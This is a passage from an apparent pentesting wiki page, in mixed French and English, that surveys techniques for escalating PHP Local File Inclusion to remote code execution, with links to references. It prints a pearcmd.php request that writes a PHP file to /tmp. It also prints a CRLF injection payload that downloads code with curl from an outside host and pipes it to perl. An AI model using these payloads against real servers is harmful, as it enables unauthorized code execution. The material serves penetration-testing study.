This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Téléversez** un fichier qui sera stocké **temporairement** dans `/tmp`, puis dans la **même requête,** provoquez un **segmentation fault**, et alors le **fichier temporaire ne sera pas supprimé** et vous pourrez le rechercher.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Si vous avez trouvé une **Local File Inclusion** et que **Nginx** fonctionne devant **PHP**, vous pourriez obtenir **RCE** avec la technique suivante :


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Si vous avez trouvé une **Local File Inclusion** même si vous **n'avez pas de session** et que `session.auto_start` est `Off`. Si vous fournissez le **`PHP_SESSION_UPLOAD_PROGRESS`** dans des données **multipart POST**, PHP **activera la session pour vous**. Vous pouvez abuser de cela pour obtenir **RCE** :


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Si vous avez trouvé une **Local File Inclusion** et que le serveur tourne sous **Windows**, vous pourriez obtenir **RCE** :


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
L'exemple suivant exploite une vuln CRLF pour obtenir RCE (d'après [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Si vous trouvez une **Local File Inclusion** et un fichier exposant **phpinfo()** avec file_uploads = on, vous pouvez obtenir RCE :


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Si vous trouvez une **Local File Inclusion** et que vous **pouvez exfiltrer le chemin** du fichier temporaire MAIS que le **serveur** **vérifie** si le **fichier à inclure contient des balises PHP**, vous pouvez essayer de **bypass** cette vérification avec ce **Race Condition** :


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Si vous pouvez abuser de la LFI pour **uploader des fichiers temporaires** et faire en sorte que le serveur **bloque** l'exécution PHP, vous pouvez ensuite **brute force** des noms de fichiers pendant des heures pour retrouver le fichier temporaire :


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Si vous incluez l'un des fichiers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Vous devez inclure le même fichier 2 fois pour provoquer cette erreur).

**Je ne sais pas en quoi c'est utile mais ça pourrait l'être.**\
_Même si vous provoquez une PHP Fatal Error, les fichiers temporaires PHP uploadés sont supprimés._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
